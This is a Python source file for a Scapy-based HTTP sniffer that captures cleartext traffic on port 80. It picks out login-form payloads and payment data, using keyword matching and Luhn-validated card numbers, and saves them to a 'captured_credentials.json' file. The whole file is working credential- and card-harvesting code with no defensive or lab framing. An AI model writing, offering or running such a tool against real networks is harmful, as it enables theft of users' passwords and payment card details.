import json
import re
from datetime import datetime
from scapy.all import sniff, TCP, Raw, IP

class HTTPSniffer:
    """
    Class to track HTTP queries using Scapy.
    Includes:
      - Stopping the sniffer,
      - Saving captured credentials and data,
      - Advanced detection of payment/login forms.
    """

    def __init__(self, interface, callback, max_captures=1000):
        """
        :param interface: Network interface (e.g., 'eth0').
        :param callback: Function to receive text for UI display (logging).
        :param max_captures: Maximum number of packets to store in memory.
        """
        self.interface = interface
        self.callback = callback  # Instead of results_text, we pass a logging function
        self.max_captures = max_captures

        self.credentials_file = "captured_credentials.json"
        self.captured_file = "captured_http.json"

        # Lists to store data
        self.captured_data = []         # [ {...}, ... ] with requests/responses
        self.captured_credentials = []  # [ {...}, ... ] with sensitive data
        self.stopped = False

    # ------------------------------------------------------------------
    # 1) MAIN PROCESSING LOGIC
    # ------------------------------------------------------------------
    def process_packet(self, packet):
        """
        Filters and processes HTTP packets on port 80.
        Distinguishes between requests (dport == 80) and responses (sport == 80).
        Checks for payment and login forms.
        """

        if not packet.haslayer(TCP) or not packet.haslayer(Raw) or not packet.haslayer(IP):
            return

        # Determine if it is a request or response
        # Since our filter is tcp port 80, we'll see:
        #   - Request: packet[TCP].dport == 80
        #   - Response: packet[TCP].sport == 80
        is_request = (packet[TCP].dport == 80)
        is_response = (packet[TCP].sport == 80)

        # Extract the payload as text
        payload = packet[Raw].load.decode(errors="ignore")

        # Prepare basic data
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        # Generate a dict with basic information
        packet_info = {
            "timestamp": timestamp,
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "payload": payload
        }

        # Log to the UI (optional)
        if self.callback:
            dir_text = "Request" if is_request else "Response"
            self.callback(f"[+] HTTP {dir_text} detected:")
            self.callback(f"  Timestamp: {timestamp}")
            self.callback(f"  Source: {src_ip} -> Destination: {dst_ip}")
            self.callback(f"  Payload: {payload[:200]}...")  # Show only 200 characters
            self.callback("")

        # -----------------------------------------------
        # 1.1) Payment Data Detection
        # -----------------------------------------------
        if is_request and self.detect_payment_form(payload):
            if self.callback:
                self.callback("[!] Possible payment data detected!")
            # Save in credentials
            self.captured_credentials.append({
                "timestamp": timestamp,
                "source_ip": src_ip,
                "destination_ip": dst_ip,
                "payment_form_data": payload
            })

        # -----------------------------------------------
        # 1.2) Login Detection
        # -----------------------------------------------
        if is_request and self.detect_login_form(payload):
            if self.callback:
                self.callback("[!] Possible login form detected!")
            self.captured_credentials.append({
                "timestamp": timestamp,
                "source_ip": src_ip,
                "destination_ip": dst_ip,
                "login_form_data": payload
            })

        # -----------------------------------------------
        # 1.3) Save in captured_data
        # -----------------------------------------------
        # We can classify as "request_payload" or "response_payload"
        if is_request:
            packet_info["type"] = "request"
        elif is_response:
            packet_info["type"] = "response"
        else:
            packet_info["type"] = "unknown"

        self.captured_data.append(packet_info)

        # Prevent indefinite growth
        if len(self.captured_data) > self.max_captures:
            self.captured_data.pop(0)

    # ------------------------------------------------------------------
    # 2) DETECTIONS
    # ------------------------------------------------------------------
    def detect_payment_form(self, payload):
        """
        Detects if the payload contains possible payment data.
        Includes keyword checking and Luhn validation of a card.
        """
        # Check keywords
        keywords = ["card", "credit", "debit", "expiry", "cvv", "cvc", "payment", "billing"]
        for keyword in keywords:
            if keyword in payload.lower():
                return True

        # Search for sequences of 13 to 16 digits
        card_pattern = r"\b(\d[ -]*){13,16}\b"
        possible_cards = re.findall(card_pattern, payload)
        if possible_cards:
            # Reconstruct each group of digits
            # The regex with complex groups sometimes returns partial strings
            # A more reliable alternative:
            card_pattern_full = r"\b(?:\d[ -]?){13,16}\b"
            matches_full = re.findall(card_pattern_full, payload)
            for match_str in matches_full:
                # Clean spaces/dashes
                candidate = re.sub(r"[ -]", "", match_str)
                if self.is_luhn_valid(candidate):
                    return True

        return False

    def detect_login_form(self, payload):
        """
        Detects if the payload contains login credentials
        (username, user, login, password, passwd, pwd, etc.)
        """
        login_keywords = ["username", "user=", "login", "password", "passwd", "pwd"]
        p_lower = payload.lower()
        for kw in login_keywords:
            if kw in p_lower:
                return True
        return False

    def is_luhn_valid(self, number_str):
        """
        Validates a card number using the Luhn algorithm.
        Returns True if it passes validation.
        """
        s = 0
        rev_digits = number_str[::-1]
        for idx, digit in enumerate(rev_digits):
            if not digit.isdigit():
                return False
            n = int(digit)
            if (idx % 2) == 1:  # even position from 0
                n *= 2
                if n > 9:
                    n -= 9
            s += n
        return (s % 10) == 0

    # ------------------------------------------------------------------
    # 3) DATA SAVING
    # ------------------------------------------------------------------
    def save_credentials(self):
        """Saves the detected credentials to a JSON file."""
        if not self.captured_credentials:
            return
        with open(self.credentials_file, "w", encoding="utf-8") as f:
            json.dump(self.captured_credentials, f, indent=4)

    def export_captured_data(self):
        """
        Exports all captured HTTP traffic (requests/responses) to a JSON file.
        """
        with open(self.captured_file, "w", encoding="utf-8") as f:
            json.dump(self.captured_data, f, indent=4)

    # ------------------------------------------------------------------
    # 4) STOPPING THE SNIFFER
    # ------------------------------------------------------------------
    def stop(self):
        """Stops the sniffing."""
        self.stopped = True

    def _stop_filter(self, packet):
        """
        Stop filter for Scapy. If self.stopped is True,
        the sniff will be stopped by this callback.
        """
        return self.stopped

    # ------------------------------------------------------------------
    # 5) STARTING THE SNIFFER
    # ------------------------------------------------------------------
    def start(self):
        """
        Starts the HTTP sniffer using Scapy.
        Filters all traffic on TCP/80 (HTTP).
        """
        sniff(
            iface=self.interface,
            filter="tcp port 80",
            prn=self.process_packet,
            store=0,
            stop_filter=self._stop_filter
        )
